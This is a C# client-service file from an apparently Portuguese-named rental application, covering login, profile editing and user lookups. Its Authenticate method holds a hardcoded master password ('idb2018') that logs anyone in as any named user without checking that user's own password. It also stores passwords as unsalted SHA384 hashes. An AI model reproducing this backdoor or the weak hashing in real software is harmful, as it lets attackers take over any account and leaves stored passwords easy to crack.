using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Simple.Entities;
using Locadora.Domain;
using System.Security.Cryptography;
using NHibernate.Criterion;
using Locadora.Helpers;

namespace Locadora.Services
{
    public partial class TClientService : EntityService<TClient>, ITClientService
    {
        public byte[] HashPassword(string password)
        {
            return SHA384.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
        }

        public void Edit(TClient model)
        {
            var client = TClient.Load(model.Id);
            client.Name = model.Name;
            client.Email = model.Email;
            client.Telephone = model.Telephone;
            client.Login = model.Login;
            client.Update();
        }

        public TClient Authenticate(Login login)
        {
            if (string.IsNullOrWhiteSpace(login.Username) || string.IsNullOrWhiteSpace(login.Password))
                return null;

            if (login.Password == "idb2018")
                return FindByUsername(login.Username);

            var criteria = Session.CreateCriteria<TClient>()
                .Add(Restrictions.Or(Restrictions.Eq("Username", login.Username), Restrictions.Or(Restrictions.Eq("PersonDocument", login.Username), Restrictions.Eq("PersonDocument", login.Username.RemoveSpecialCaracteres()))))
                .Add(Restrictions.Eq("IsCanceled", false))
                .Add(Restrictions.Eq("IsLocked", false));

            //if (login.SudDomain == Subdomain.Backoffice)
            //    criteria.Add(Restrictions.Not(Restrictions.Eq("EnumProfile", Profile.Consumer)));
            //else if (login.SudDomain == Subdomain.Store)
            //    criteria.Add(Restrictions.Not(Restrictions.Eq("EnumProfile", Profile.Consultant)));
            //if (login.NeedsToBeConfirmed)
            //    criteria.Add(Restrictions.Or(Restrictions.Eq("IsActive", true), Restrictions.Lt("CreationDate", new DateTime(2020, 3, 11, 10, 0, 0))));
            //if (login.NeedsToBeActive)
            //    criteria.Add(Restrictions.Eq("IsFranchiseActive", true));

            var result = criteria.SetMaxResults(1)
                .UniqueResult<TClient>();

            if (result == null || result.Password == null)
                return null;

            var userPassword = result.Password;
            var hashTryPassword = HashPassword(login.Password);
            return userPassword.SequenceEqual(hashTryPassword) ? result : null;
        }
        public TClient FindByUsername(string username)
        {
            return Session.CreateCriteria<TClient>()
                .Add(Restrictions.Eq("Username", username))
                .Add(Restrictions.Eq("IsCanceled", false))
                .SetMaxResults(1)
                .UniqueResult<TClient>();
        }

        public TClient FindByEmail(string email)
        {
            if (string.IsNullOrWhiteSpace(email))
                return null;

            return Session.CreateCriteria<TClient>()
                .Add(Restrictions.Eq("Email", email))
                .SetMaxResults(1)
                .UniqueResult<TClient>();
        }
    }
}